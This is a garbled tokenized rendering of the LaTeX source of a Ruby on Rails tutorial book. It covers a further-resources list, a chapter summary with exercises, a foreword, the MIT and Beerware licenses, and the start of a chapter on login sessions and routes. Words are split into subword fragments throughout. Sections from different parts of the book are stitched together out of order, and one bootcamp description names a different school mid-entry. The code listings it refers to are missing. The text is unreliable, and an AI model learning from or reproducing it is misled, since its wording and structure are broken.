▁Here ▁are ▁some ▁suggest ion s ▁for ▁further ▁learning :
▁\ href { http :// screencasts . railstutorial . org /}{ The ▁Ruby ▁on ▁Rails ▁Tutorial ▁screencasts } : ▁I ▁offer ▁a ▁full - length ▁screencast ▁course ▁base d ▁on ▁this ▁book .
▁In ▁addition ▁to ▁cover ing ▁all ▁the ▁material ▁in ▁the ▁book , ▁the ▁screencasts ▁are ▁ filled ▁with ▁t ips , ▁trick s , ▁and ▁the ▁kind ▁of ▁see - how - it ' s - d one ▁ demo s ▁that ▁are ▁hard ▁to ▁capture ▁in ▁ print .
▁They ▁are ▁available ▁for ▁purchas e ▁through ▁the ▁\ href { http :// www . railstutorial . org /}{ Ruby ▁on ▁Rails ▁Tutorial ▁website }.
▁\ href { http :// www . go t ealeaf . com / railstutorial }{ T ealeaf ▁A ca de my } : ▁L o t s ▁of ▁in - person ▁developer ▁b oo t ca mp s ▁have ▁sp ru n g ▁up ▁in ▁ recent ▁ years , ▁and ▁I ▁recommend ▁look ing ▁for ▁one ▁in ▁your ▁are a , ▁but ▁\ href { http :// www . go t ealeaf . com / railstutorial }{ T ealeaf ▁A ca de my } ▁is ▁available ▁online ▁and ▁so ▁can ▁be ▁take n ▁from ▁any where .
▁T ealeaf ▁is ▁an ▁es pecially ▁good ▁choice ▁if ▁you ▁want ▁instruct or ▁feedback ▁within ▁the ▁context ▁of ▁a ▁structure d ▁c ur r ic ul um .
▁ Most ▁of ▁their ▁stud ent s ▁start ▁with ▁ limited ▁programming ▁experience ▁but ▁have ▁the ▁ de ter m in ation ▁and ▁d r ive ▁needed ▁to ▁ pick ▁it ▁up ▁quickly .
▁T ur ing ▁guarantee s ▁its ▁stud ent s ▁will ▁find ▁a ▁job ▁after ▁gra d u at ing ▁or ▁they ' ll ▁ ref un d ▁the ▁co st ▁of ▁t u it ion .
▁\ href { http :// www . th in k ful . com / a / railstutorial }{ T h in k ful } : ▁An ▁online ▁class ▁that ▁pair s ▁you ▁with ▁a ▁p rofessional ▁engine er ▁as ▁you ▁work ▁through ▁a ▁project - base d ▁c ur r ic ul um .
▁S u b j ec t s ▁include ▁Ruby ▁on ▁Rails , ▁front - end ▁development , ▁web ▁design , ▁and ▁data ▁ science .
▁\ href { https :// tutorial s . rails app s . org / hartl }{ Rails A p p s } : ▁In str u c tive ▁sample ▁Rails ▁app s
▁\ href { http :// m b s y . co / 6 V Q 8 l }{ C ode ▁School } : ▁A ▁large ▁variety ▁of ▁interactive ▁programming ▁course s
▁\ href { https :// www . u de my . com / learn - test - driven - development - in - ruby / co upon C ode = hartl }{ B al a ▁P ar an j ' s ▁ Test ▁D r ive n ▁De ve lo p ment ▁in ▁Ruby } : ▁A ▁more ▁advanced ▁online ▁course ▁focus ing ▁on ▁ TDD ▁in ▁pure ▁Ruby
▁\ href { http :// r ailscasts . com /}{ RailsCast s } : ▁I ▁suggest ▁starting ▁by ▁visit ing ▁the ▁\ href { http :// r ailscasts . com / episodes / archive }{ RailsCast s ▁e p is ode ▁ archive } ▁and ▁click ing ▁on ▁subject s ▁that ▁catch ▁your ▁e y e .
▁Ruby ▁and ▁Rails ▁book s : ▁For ▁further ▁Ruby ▁learning , ▁I ▁recommend ▁\ href { http :// www . a mazon . com / g p / product /1 4 3022 36 34 }{\ emph { B eginning ▁Ruby } } ▁by ▁P e ter ▁Co o p er , ▁\ href { http :// www . a mazon . com / g p / product / 19 3 39 88 6 57 }{\ emph { The ▁We ll - G rounded ▁Ruby ist } } ▁by ▁ David ~ A . ▁B la c k , ▁\ href { http :// www . a mazon . com / Eloquent - Ruby - A d d is on - We s le y - P rofessional - Seri es / d p / 0 3 2 1 58 4 10 4 / }{\ emph { Eloquent ▁Ruby } } ▁by ▁R us s ▁O l s en , ▁and ▁\ href { http :// www . a mazon . com / g p / product / 06 7 23 2 88 44 }{\ emph { The ▁Ruby ▁Way } } ▁by ▁H al ▁F ul to n .
▁For ▁further ▁Rails ▁learning , ▁I ▁recommend ▁\ href { https :// p ra g prog . com / book / rails 4 / a g i le - web - development - with - rails - 4 }{ A g i le ▁Web ▁De ve lo p ment ▁with ▁Rails } ▁by ▁S am ▁Ruby , ▁D a ve ▁Thomas , ▁and ▁ David ▁H einemeier ▁Hansson , ▁\ href { http :// www . a mazon . com / Rails - Edit ion - A d d is on - We s le y - P rofessional - Seri es / d p / 0 3 2 19 44 27 5 }{\ emph { The ▁Rails ~ 4 ▁Way } } ▁by ▁O b i e ▁F er n and e z ▁and ▁ K evi n ▁F a us t in o , ▁and ▁\ href { http :// www . a mazon . com / Rails - 4 - Action - Ryan - B ig g / d p / 16 17 2 9 10 99 }{\ emph { Rails ~ 4 ▁in ▁Action } } ▁by ▁ Ryan ▁B ig g ▁and ▁ Y e h u d a ▁ K at z .
▁< n >< n >\ end { item ize }< n >< n > ▁% ▁subsection ▁guide _ to _ f urther _ resources ▁( end )< n >< n > ▁\ subsection { What ▁we ▁ learned ▁in ▁this ▁chapter } ▁% ▁( fold )< n > ▁\ label { sec : following _ users _ what _ we _ learned _ in _ this _ chapter }< n >< n >\ begin { item ize }< n >\ item
▁Rails ' ▁\ k ode { has \_ many ▁: through } ▁allows ▁the ▁model ing ▁of ▁complicated ▁data ▁relationships .
▁The ▁\ k ode { has \_ many } ▁method ▁take s ▁sever al ▁optional ▁arguments , ▁including ▁the ▁object ▁class ▁name ▁and ▁the ▁foreign ▁key .
▁Using ▁\ k ode { has \_ many } ▁and ▁\ k ode { has \_ many ▁: through } ▁with ▁properly ▁chose n ▁class ▁names ▁and ▁foreign ▁keys , ▁we ▁can ▁model ▁both ▁active ▁( following ) ▁and ▁ passive ▁( be ing ▁followed ) ▁relationships .
▁Rails ▁routing ▁supports ▁nested ▁routes .
▁The ▁\ k ode { where } ▁method ▁is ▁a ▁flexible ▁and ▁powerful ▁way ▁to ▁create ▁database ▁queries .
▁Rails ▁supports ▁is s u ing ▁lower - level ▁SQL ▁queries ▁if ▁needed .
▁By ▁ putting ▁together ▁everything ▁we ' ve ▁ learned ▁in ▁this ▁book , ▁we ' ve ▁successfully ▁implemented ▁user ▁following ▁with ▁a ▁status ▁feed ▁of ▁microposts ▁from ▁followed ▁users .
▁Writ e ▁tests ▁for ▁the ▁stats ▁on ▁the ▁Home ▁and ▁profile ▁pages .
▁\ emph { Hint } : ▁Add ▁to ▁the ▁test ▁in ▁Listing ~\ ref { code : user _ profile _ test }.
▁( W h y ▁don ' t ▁we ▁have ▁to ▁test ▁the ▁stats ▁on ▁the ▁Home ▁page ▁separate ly ? )
▁Writ e ▁a ▁test ▁to ▁verify ▁that ▁the ▁first ▁page ▁of ▁the ▁feed ▁appears ▁on ▁the ▁Home ▁page ▁as ▁required .
▁A ▁template ▁appears ▁in ▁Listing ~\ ref { code : home _ feed _ test }.
▁Note ▁the ▁use ▁of ▁HTML ▁es ca p ing ▁via ▁\ k ode { C G I . escape HTML } ; ▁see ▁if ▁you ▁can ▁ figure ▁out ▁why ▁this ▁is ▁necessary .
▁( T ry ▁remov ing ▁the ▁es ca p ing ▁and ▁careful ly ▁ inspect ▁the ▁page ▁source ▁for ▁the ▁micropost ▁content ▁that ▁does n ' t ▁match .)
▁Testing ▁the ▁feed ▁HTML .
▁My ▁form er ▁company ▁( C D ▁B a by ) ▁was ▁one ▁of ▁the ▁first ▁to ▁ loud ly ▁switch ▁to ▁Ruby ▁on ▁Rails , ▁and ▁the n ▁even ▁more ▁ loud ly ▁switch ▁back ▁to ▁P H P ▁( G oo g le ▁me ▁to ▁read ▁about ▁the ▁d ra ma ).
▁This ▁book ▁by ▁ Michael ▁Hartl ▁ ca me ▁so ▁high ly ▁recommended ▁that ▁I ▁ha d ▁to ▁try ▁it , ▁and ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁is ▁what ▁I ▁used ▁to ▁switch ▁back ▁to ▁Rails ▁again .
▁T h ough ▁I ' ve ▁work ed ▁my ▁way ▁through ▁many ▁Rails ▁book s , ▁this ▁is ▁the ▁one ▁that ▁finally ▁made ▁me ▁`` get '' ▁it .
▁E verything ▁is ▁done ▁very ▁much ▁`` the ▁Rails ▁way '' --- a ▁way ▁that ▁f el t ▁very ▁un n at ur al ▁to ▁me ▁before , ▁but ▁now ▁after ▁doing ▁this ▁book ▁finally ▁feel s ▁natural .
▁This ▁is ▁also ▁the ▁only ▁Rails ▁book ▁that ▁does ▁test - driven ▁development ▁the ▁entire ▁time , ▁an ▁approach ▁high ly ▁recommended ▁by ▁the ▁ expert s ▁but ▁which ▁has ▁ never ▁been ▁so ▁clear ly ▁demonstrate d ▁before .
▁F inally , ▁by ▁including ▁Git , ▁GitHub , ▁and ▁Heroku ▁in ▁the ▁ demo ▁examples , ▁the ▁author ▁really ▁gives ▁you ▁a ▁feel ▁for ▁what ▁it ' s ▁like ▁to ▁do ▁a ▁real - world ▁project .
▁The ▁tutorial ' s ▁code ▁examples ▁are ▁not ▁in ▁is ol ation .
▁The ▁line ar ▁ n ar ra tive ▁is ▁such ▁a ▁great ▁format .
▁This ▁is ▁not ▁typical !
▁ Getting ▁through ▁the ▁entire ▁book ▁usually ▁take s ▁\ emph { much } ▁longer ▁than ▁three ▁days .
▁Do ▁it ▁from ▁start ▁to ▁finish , ▁without ▁jump ing ▁around , ▁and ▁you ' ll ▁get ▁the ▁ ultimate ▁benefit .
▁E n j o y !
▁\ href { http :// s ivers . org /}{ D er e k ▁S ivers } ▁(\ href { http :// s ivers . org /}{ s ivers . org })
▁F ound er , ▁C D ▁B a by
▁Co p y right ▁and ▁ license
▁\ emph { Ruby ▁on ▁Rails ▁Tutorial : ▁ Learn ▁Web ▁De ve lo p ment ▁with ▁Rails }.
▁All ▁source ▁code ▁in ▁the ▁\ emph { Ruby ▁on ▁Rails ▁Tutorial } ▁is ▁available ▁join t ly ▁under ▁the ▁\ href { http :// open source . org / license s / M I T }{ M I T ▁L ic en se } ▁and ▁the ▁\ href { http :// people . free b s d . org / ~ ph k /}{ B e er w a re ▁L ic en se }.
▁The ▁M I T ▁L ic en se < n >< n > Co p y right ▁( c ) ▁2014 ▁ Michael ▁Hartl < n >< n > P er m is s ion ▁is ▁here by ▁gra n t ed , ▁free ▁of ▁charge , ▁to ▁any ▁person ▁obtain ing ▁a ▁copy < n > of ▁this ▁software ▁and ▁ associated ▁documentation ▁files ▁( the ▁" Software ") , ▁to ▁deal < n > in ▁the ▁ Software ▁without ▁restrict ion , ▁including ▁without ▁limit ation ▁the ▁right s < n > to ▁use , ▁copy , ▁modify , ▁merge , ▁p u b li s h , ▁d ist r i but e , ▁sub license , ▁and / or ▁ se ll < n > co p ies ▁of ▁the ▁ Software , ▁and ▁to ▁ permit ▁person s ▁to ▁who m ▁the ▁ Software ▁is < n > f ur n is h ed ▁to ▁do ▁so , ▁subject ▁to ▁the ▁following ▁conditions : < n >< n > The ▁above ▁copy right ▁notice ▁and ▁this ▁ permission ▁notice ▁shall ▁be ▁included ▁in < n > all ▁copie s ▁or ▁substan tial ▁ port ion s ▁of ▁the ▁ Software .
▁< n >< n > THE ▁S O F T W A RE ▁I S ▁P R O V ID E D ▁" A S ▁I S ", ▁W I T H O UT ▁W A R R A N T Y ▁O F ▁A N Y ▁ K IN D , ▁E X P RE SS ▁OR < n > I M P L I E D , ▁ IN C L U D ING ▁B UT ▁ NOT ▁LIMIT E D ▁T O ▁ THE ▁W A R R A N T I E S ▁O F ▁M ER C H A N T A B I L I T Y ,< n > F I T N E SS ▁F O R ▁A ▁P A R T I C U L A R ▁P U R P O S E ▁ AND ▁N ON IN F R ING E ME N T .
▁ IN ▁N O ▁E V E N T ▁S H A L L ▁ THE < n > A UT H O R S ▁OR ▁C O P Y R I G H T ▁H O L DER S ▁B E ▁L I A B LE ▁F O R ▁A N Y ▁C L A I M , ▁D A M A G E S ▁OR ▁O THE R < n > L I A B I L I T Y , ▁W H E THE R ▁ IN ▁A N ▁A C T I ON ▁O F ▁C ON T R A C T , ▁T O R T ▁OR ▁O THE R W I S E , ▁A R I S ING ▁FROM ,< n > O UT ▁O F ▁OR ▁ IN ▁C ON N E C T I ON ▁W I T H ▁ THE ▁S O F T W A RE ▁OR ▁ THE ▁U S E ▁OR ▁O THE R ▁D E A L ING S ▁ IN < n > THE ▁S O F T W A RE .
▁/ * < n > ▁* ▁--------------- ------------- ---------------- ---------------- ---------------- < n > ▁* ▁" THE ▁B E ER W A RE ▁L I C E N S E " ▁( R evi s ion ▁4 3 ) : < n > ▁* ▁ Michael ▁Hartl ▁wrote ▁this ▁code .
▁As ▁long ▁as ▁you ▁re t a in ▁this ▁notice ▁you < n > ▁* ▁can ▁do ▁what ever ▁you ▁want ▁with ▁this ▁ stuff .
▁If ▁we ▁me et ▁some ▁day , ▁and ▁you ▁think
▁< n > ▁* ▁this ▁ stuff ▁is ▁worth ▁it , ▁you ▁can ▁b u y ▁me ▁a ▁be er ▁in ▁return .
▁< n > ▁* ▁--------------- ------------- ---------------- ---------------- ---------------- < n > ▁* /
▁Now ▁that ▁new ▁users ▁can ▁sign ▁up ▁for ▁our ▁site ▁( Chapter ~\ ref { cha : sign _ up }), ▁it ' s ▁time ▁to ▁give ▁them ▁the ▁ability ▁to ▁log ▁in ▁and ▁log ▁out .
▁We ' ll ▁be ▁implement ing ▁all ▁three ▁of ▁the ▁most ▁common ▁models ▁for ▁login / logout ▁behavior ▁on ▁the ▁web : ▁`` for getting '' ▁users ▁on ▁browser ▁close ▁( Section ~\ ref { sec : sessions _ and _ failed _ login } ▁and ▁Section ~\ ref { sec : logging _ in }), ▁\ emph { a utomatically } ▁remember ing ▁users ▁( Section ~\ ref { sec : remember _ me }), ▁and ▁\ emph { option ally } ▁remember ing ▁users ▁base d ▁on ▁the ▁value ▁of ▁a ▁`` remember ▁me '' ▁checkbox ▁( Section ~\ ref { sec : remember _ me _ checkbox })
▁A nother ▁common ▁model ▁is ▁to ▁expire ▁the ▁session ▁after ▁a ▁certain ▁amount ▁of ▁time .
▁This ▁is ▁es pecially ▁appropriate ▁on ▁site s ▁containing ▁ sensitive ▁information , ▁such ▁as ▁b an k ing ▁and ▁f in an cial ▁tr ad ing ▁account s .
▁The ▁authentication ▁system ▁we ▁develop ▁in ▁this ▁chapter ▁will ▁allow ▁us ▁to ▁customize ▁the ▁site ▁and ▁implement ▁an ▁authorization ▁model ▁base d ▁on ▁login ▁status ▁and ▁identity ▁of ▁the ▁current ▁user .
▁For ▁example , ▁in ▁this ▁chapter ▁we ' ll ▁update ▁the ▁site ▁header ▁with ▁login / logout ▁links ▁and ▁a ▁profile ▁link .
▁In ▁Chapter ~\ ref { cha : updating _ showing _ and _ deleting _ users }, ▁we ' ll ▁i mp o se ▁a ▁security ▁model ▁in ▁which ▁only ▁logged - in ▁users ▁can ▁visit ▁the ▁user ▁index ▁page , ▁only ▁the ▁correct ▁user ▁can ▁access ▁the ▁page ▁for ▁editing ▁their ▁information , ▁and ▁only ▁ administrative ▁users ▁can ▁delete ▁other ▁users ▁from ▁the ▁database .
▁F inally , ▁in ▁Chapter ~\ ref { cha : user _ microposts }, ▁we ' ll ▁use ▁the ▁identity ▁of ▁a ▁logged - in ▁user ▁to ▁create ▁microposts ▁ associated ▁with ▁that ▁user , ▁and ▁in ▁Chapter ~\ ref { cha : following _ users } ▁we ' ll ▁allow ▁the ▁current ▁user ▁to ▁follow ▁other ▁users ▁of ▁the ▁application ▁( the re by ▁ r eceiving ▁a ▁feed ▁of ▁their ▁microposts ).
▁This ▁is ▁a ▁long ▁and ▁challenging ▁chapter ▁cover ing ▁many ▁ detailed ▁aspect s ▁of ▁login ▁common ▁systems , ▁so ▁I ▁recommend ▁focus ing ▁on ▁com p let ing ▁it ▁section ▁by ▁section .
▁In ▁addition , ▁many ▁readers ▁have ▁report ed ▁benefit ing ▁from ▁going ▁through ▁it ▁a ▁second ▁time .
▁\ href { http :// en . wiki p edia . org / wiki / H ypertext _ Transfer _ Protocol }{ HTTP } ▁is ▁a ▁\ href { https :// en . wiki p edia . org / wiki / State less _ proto c ol }{\ emph { state less ▁protocol } }, ▁treat ing ▁each ▁request ▁as ▁an ▁in dependent ▁ transaction ▁that ▁is ▁un able ▁to ▁use ▁information ▁from ▁any ▁previous ▁requests .
▁This ▁means ▁there ▁is ▁no ▁way ▁\ href { http :// en . wiki p edia . org / wiki / H ypertext _ Transfer _ Protocol # HTTP _ session _ state }{ with in ▁the ▁h ypertext ▁transfer ▁protocol } ▁to ▁remember ▁a ▁user ' s ▁identity ▁from ▁page ▁to ▁page ; ▁instead , ▁web ▁applications ▁requiring ▁user ▁login ▁must ▁use ▁a ▁\ href { http :// en . wiki p edia . org / wiki / Session _ ( computer _ science ) }{\ emph { session } }, ▁which ▁is ▁a ▁semi - permanent ▁connection ▁between ▁two ▁computer s ▁( such ▁as ▁a ▁client ▁computer ▁running ▁a ▁web ▁browser ▁and ▁a ▁server ▁running ▁Rails ).
▁The ▁most ▁common ▁technique s ▁for ▁implement ing ▁sessions ▁in ▁Rails ▁involve ▁using ▁\ href { http :// en . wiki p edia . org / wiki / HTTP _ cookie }{\ emph { cookies } }, ▁which ▁are ▁small ▁pieces ▁of ▁text ▁placed ▁on ▁the ▁user ' s ▁browser .
▁Because ▁cookies ▁persist ▁from ▁one ▁page ▁to ▁the ▁next , ▁they ▁can ▁store ▁information ▁( such ▁as ▁a ▁user ▁id ) ▁that ▁can ▁be ▁used ▁by ▁the ▁application ▁to ▁retrieve ▁the ▁logged - in ▁user ▁from ▁the ▁database .
▁Some ▁browsers ▁offer ▁an ▁option ▁to ▁re store ▁such ▁sessions ▁via ▁a ▁`` co n t in ue ▁where ▁you ▁left ▁off '' ▁feature , ▁but ▁of ▁course ▁Rails ▁has ▁no ▁control ▁over ▁this ▁behavior .
▁It ' s ▁convenient ▁to ▁model ▁sessions ▁as ▁a ▁RESTful ▁resource : ▁visit ing ▁the ▁login ▁page ▁will ▁render ▁a ▁form ▁for ▁\ emph { new } ▁sessions , ▁logging ▁in ▁will ▁\ emph { create } ▁a ▁session , ▁and ▁logging ▁out ▁will ▁\ emph { destroy } ▁it .
▁Un like ▁the ▁Users ▁resource , ▁which ▁uses ▁a ▁database ▁back - end ▁( via ▁the ▁User ▁model ) ▁to ▁persist ▁data , ▁the ▁Sessions ▁resource ▁will ▁use ▁cookies , ▁and ▁much ▁of ▁the ▁work ▁involve d ▁in ▁login ▁comes ▁from ▁build ing ▁this ▁cookie - base d ▁authentication ▁machinery .
▁In ▁this ▁section ▁and ▁the ▁next , ▁we ' ll ▁ prepare ▁for ▁this ▁work ▁by ▁construct ing ▁a ▁Sessions ▁controller , ▁a ▁login ▁form , ▁and ▁the ▁relevant ▁controller ▁actions .
▁We ' ll ▁the n ▁complete ▁user ▁login ▁in ▁Section ~\ ref { sec : logging _ in } ▁by ▁adding ▁the ▁necessary ▁session - manipulati on ▁code .
▁As ▁in ▁previous ▁chapter s , ▁we ' ll ▁do ▁our ▁work ▁on ▁a ▁topic ▁branch ▁and ▁merge ▁in ▁the ▁changes ▁at ▁the ▁end :
▁The ▁elements ▁of ▁logging ▁in ▁and ▁out ▁correspond ▁to ▁particular ▁REST ▁actions ▁of ▁the ▁Sessions ▁controller : ▁the ▁login ▁form ▁is ▁handle d ▁by ▁the ▁\ k ode { new } ▁action ▁( c over ed ▁in ▁this ▁section ), ▁actually ▁logging ▁in ▁is ▁handle d ▁by ▁sending ▁a ▁\ text tt { POST } ▁request ▁to ▁the ▁\ k ode { create } ▁action ▁( Section ~\ ref { sec : logging _ in }), ▁and ▁logging ▁out ▁is ▁handle d ▁by ▁sending ▁a ▁\ text tt { DELETE } ▁request ▁to ▁the ▁\ k ode { destroy } ▁action ▁( Section ~\ ref { sec : logging _ out }).
▁( Re c all ▁the ▁association ▁of ▁HTTP ▁verb s ▁with ▁REST ▁actions ▁from ▁Table ~\ ref { table : RESTful _ users }. )
▁To ▁get ▁started , ▁we ' ll ▁generate ▁a ▁Sessions ▁controller ▁with ▁a ▁\ k ode { new } ▁action :
▁Follow ing ▁the ▁model ▁from ▁Section ~\ ref { sec : signup _ form } ▁for ▁the ▁signup ▁page , ▁our ▁plan ▁is ▁to ▁create ▁a ▁login ▁form ▁for ▁creating ▁new ▁sessions , ▁as ▁mock ed ▁up ▁in ▁F igure ~\ ref { fig : login _ mockup }.
▁A ▁mockup ▁of ▁the ▁login ▁form .
▁Un like ▁the ▁Users ▁resource , ▁which ▁used ▁the ▁special ▁\ k ode { resources } ▁method ▁to ▁obtain ▁a ▁full ▁suite ▁of ▁RESTful ▁routes ▁automatically ▁( Listing ~\ ref { code : users _ resource }), ▁the ▁Sessions ▁resource ▁will ▁use ▁only ▁named ▁routes , ▁handling ▁\ text tt { GET } ▁and ▁\ text tt { POST } ▁requests ▁with ▁the ▁\ k ode { login } ▁route ▁and ▁\ text tt { DELETE } ▁request ▁with ▁the ▁\ k ode { logout } ▁route .
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : sessions _ resource } ▁( which ▁also ▁delete s ▁the ▁un n e ed ed ▁routes ▁generated ▁by ▁\ k ode { rails ▁generate ▁controller }).
▁ Adding ▁a ▁resource ▁to ▁get ▁the ▁standard ▁RESTful ▁actions ▁for ▁sessions .
▁The ▁routes ▁defined ▁in ▁Listing ~\ ref { code : sessions _ resource } ▁correspond ▁to ▁URLs ▁and ▁actions ▁similar ▁to ▁those ▁for ▁users ▁( Table ~\ ref { table : RESTful _ users }), ▁as ▁show n ▁in ▁Table ~\ ref { table : RESTful _ sessions }.
▁page ▁for ▁a ▁new ▁session ▁( login )
▁create ▁a ▁new ▁session ▁( login )
▁/ logout
▁delete ▁a ▁session ▁( log ▁out )
▁Routes ▁provided ▁by ▁the ▁sessions ▁rules ▁in ▁Listing ~\ ref { code : sessions _ resource }.
▁S ince ▁we ' ve ▁now ▁added ▁sever al ▁custom ▁named ▁routes , ▁it ' s ▁useful ▁to ▁look ▁at ▁the ▁complete ▁list ▁of ▁the ▁routes ▁for ▁our ▁application , ▁which ▁we ▁can ▁generate ▁using ▁\ k ode { rake ▁routes } :
▁ $ ▁bundle ▁exec ▁rake ▁routes < n > ▁P ref i x ▁Verb ▁U R I ▁ Pattern ▁Controller # Action < n > ▁root ▁GET ▁/ ▁static _ pages # home < n > ▁help ▁GET ▁/ help ( . : format ) ▁static _ pages # help < n > ▁about ▁GET ▁/ about ( . : format ) ▁static _ pages # about < n > ▁ contact ▁GET ▁/ contact ( . : format ) ▁static _ pages # contact < n > ▁signup ▁GET ▁/ signup ( . : format ) ▁users # new < n > ▁login ▁GET ▁/ login ( . : format ) ▁sessions # new < n > ▁POST ▁/ login ( . : format ) ▁sessions # create < n > ▁ logout ▁DELETE ▁/ logout ( . : format ) ▁sessions # destroy < n > ▁users ▁GET ▁/ users ( . : format ) ▁users # index < n > ▁POST ▁/ users ( . : format ) ▁users # create < n > ▁new _ user ▁GET ▁/ users / new ( . : format ) ▁users # new < n > edit _ user ▁GET ▁/ users / : id / edit ( . : format ) ▁users # edit < n > ▁user ▁GET ▁/ users / : id ( . : format ) ▁users # show < n > ▁ PATCH ▁/ users / : id ( . : format ) ▁users # update < n > ▁ PUT ▁/ users / : id ( . : format ) ▁users # update < n > ▁DELETE ▁/ users / : id ( . : format ) ▁users # destroy
▁It ' s ▁not ▁necessary ▁to ▁understand ▁the ▁results ▁in ▁detail , ▁but ▁view ing ▁the ▁routes ▁in ▁this ▁m an n er ▁gives ▁us ▁a ▁high - level ▁ overview ▁of ▁the ▁actions ▁supported ▁by ▁our ▁application .
▁Having ▁defined ▁the ▁relevant ▁controller ▁and ▁route , ▁now ▁we ' ll ▁fill ▁in ▁the ▁view ▁for ▁new ▁sessions , ▁i . e . , ▁the ▁login ▁form .
▁ Compar ing ▁F igure ~\ ref { fig : login _ mockup } ▁with ▁F igure ~\ ref { fig : signup _ mockup }, ▁we ▁see ▁that ▁the ▁login ▁form ▁is ▁similar ▁in ▁appearance ▁to ▁the ▁signup ▁form , ▁except ▁with ▁two ▁fields ▁( email ▁and ▁password ) ▁in ▁place ▁of ▁four .
▁As ▁seen ▁in ▁F igure ~\ ref { fig : login _ failure _ mockup }, ▁when ▁the ▁login ▁information ▁is ▁invalid ▁we ▁want ▁to ▁re - render ▁the ▁login ▁page ▁and ▁display ▁an ▁error ▁message .
▁In ▁Section ~\ ref { sec : signup _ error _ messages }, ▁we ▁used ▁an ▁error - messages ▁partial ▁to ▁display ▁error ▁messages , ▁but ▁we ▁saw ▁in ▁that ▁section ▁that ▁those ▁messages ▁are ▁provided ▁automatically ▁by ▁Active ▁Record .
▁This ▁won ' t ▁work ▁for ▁session ▁creation ▁errors ▁because ▁the ▁session ▁is n ' t ▁an ▁Active ▁Record ▁object , ▁so ▁we ' ll ▁render ▁the ▁error ▁as ▁a ▁flash ▁message ▁instead .
▁A ▁mockup ▁of ▁login ▁failure .
▁Recall ▁from ▁Listing ~\ ref { code : signup _ form } ▁that ▁the ▁signup ▁form ▁uses ▁the ▁\ k ode { form \_ for } ▁helper , ▁tak ing ▁as ▁an ▁argument ▁the ▁user ▁instance ▁variable ▁\ k ode {@ user } :
▁The ▁main ▁difference ▁between ▁the ▁session ▁form ▁and ▁the ▁signup ▁form ▁is ▁that ▁we ▁have ▁no ▁ Session ▁model , ▁and ▁hence ▁no ▁an a log ue ▁for ▁the ▁\ k ode {@ user } ▁variable .
▁This ▁means ▁that , ▁in ▁construct ing ▁the ▁new ▁session ▁form , ▁we ▁have ▁to ▁give ▁\ k ode { form \_ for } ▁slightly ▁more ▁information ; ▁in ▁particular , ▁whereas
▁allows ▁Rails ▁to ▁infer ▁that ▁the ▁\ k ode { action } ▁of ▁the ▁form ▁should ▁be ▁to ▁\ text tt { POST } ▁to ▁the ▁URL ▁/ users , ▁in ▁the ▁case ▁of ▁sessions ▁we ▁need ▁to ▁indicate ▁the ▁\ emph { name } ▁of ▁the ▁resource ▁and ▁the ▁corresponding ▁URL
▁A ▁second ▁option ▁is ▁to ▁use ▁\ k ode { form \_ tag } ▁in ▁place ▁of ▁\ k ode { form \_ for }, ▁which ▁m ight ▁be ▁even ▁more ▁idiomatic ally ▁correct ▁Rails , ▁but ▁it ▁has ▁less ▁in ▁common ▁with ▁the ▁signup ▁form , ▁and ▁at ▁this ▁stage ▁I ▁want ▁to ▁emphasize ▁the ▁parallel ▁structure .
▁With ▁the ▁proper ▁\ k ode { form \_ for } ▁in ▁hand , ▁it ' s ▁easy ▁to ▁make ▁a ▁login ▁form ▁to ▁match ▁the ▁mockup ▁in ▁F igure ~\ ref { fig : login _ mockup } ▁using ▁the ▁signup ▁form ▁( Listing ~\ ref { code : signup _ form }) ▁as ▁a ▁model , ▁as ▁show n ▁in ▁Listing ~\ ref { code : login _ form }.
▁Code ▁for ▁the ▁login ▁form .
▁Note ▁that ▁we ' ve ▁added ▁a ▁link ▁to ▁the ▁signup ▁page ▁for ▁convenience .
▁With ▁the ▁code ▁in ▁Listing ~\ ref { code : login _ form }, ▁the ▁login ▁form ▁appears ▁as ▁in ▁F igure ~\ ref { fig : login _ form }.
▁( Because ▁the ▁`` Log ▁in '' ▁navigation ▁link ▁has n ' t ▁yet ▁been ▁ filled ▁in , ▁you ' ll ▁have ▁to ▁type ▁the ▁/ login ▁URL ▁directly ▁into ▁your ▁address ▁bar .
▁We ' ll ▁fix ▁this ▁blemish ▁in ▁Section ~\ ref { sec : cha n g ing _ the _ layout _ links }. )
▁The ▁login ▁form .
▁The ▁generated ▁form ▁HTML ▁appears ▁in ▁Listing ~\ ref { code : login _ form _ html }.
▁HTML ▁for ▁the ▁login ▁form ▁produce d ▁by ▁Listing ~\ ref { code : login _ form }.
▁As ▁in ▁the ▁case ▁of ▁creating ▁users ▁( signup ), ▁the ▁first ▁step ▁in ▁creating ▁sessions ▁( login ) ▁is ▁to ▁handle ▁\ emph { invalid } ▁input .
▁We ' ll ▁start ▁by ▁review ing ▁what ▁happens ▁when ▁a ▁form ▁get s ▁submitted , ▁and ▁the n ▁arrange ▁for ▁helpful ▁error ▁messages ▁to ▁appear ▁in ▁the ▁case ▁of ▁login ▁failure ▁( as ▁mock ed ▁up ▁in ▁F igure ~\ ref { fig : login _ failure _ mockup }. )
▁Then ▁we ' ll ▁ la y ▁the ▁foundation ▁for ▁successful ▁login ▁( Section ~\ ref { sec : logging _ in }) ▁by ▁evaluat ing ▁each ▁login ▁submission ▁base d ▁on ▁the ▁validity ▁of ▁its ▁email / password ▁combination .
▁Let ' s ▁start ▁by ▁defin ing ▁a ▁minimal ist ▁\ k ode { create } ▁action ▁for ▁the ▁Sessions ▁controller , ▁along ▁with ▁empty ▁\ k ode { new } ▁and ▁\ k ode { destroy } ▁actions ▁( Listing ~\ ref { code : initial _ create _ session }).
▁The ▁\ k ode { create } ▁action ▁in ▁Listing ~\ ref { code : initial _ create _ session } ▁does ▁nothing ▁but ▁render ▁the ▁\ k ode { new } ▁view , ▁but ▁it ' s ▁enough ▁to ▁get ▁us ▁started .
▁S u b m it ting ▁the ▁\ href { http :// localhost :3000/ sessions / new }{/ sessions / new } ▁form ▁the n ▁yields ▁the ▁result ▁show n ▁in ▁F igure ~\ ref { fig : initial _ failed _ login _ rails _3} .
▁A ▁pre li m in ary ▁version ▁of ▁the ▁Sessions ▁\ k ode { create } ▁action .
▁The ▁initial ▁failed ▁login , ▁with ▁\ k ode { create } ▁as ▁in ▁Listing ~\ ref { code : initial _ create _ session }.
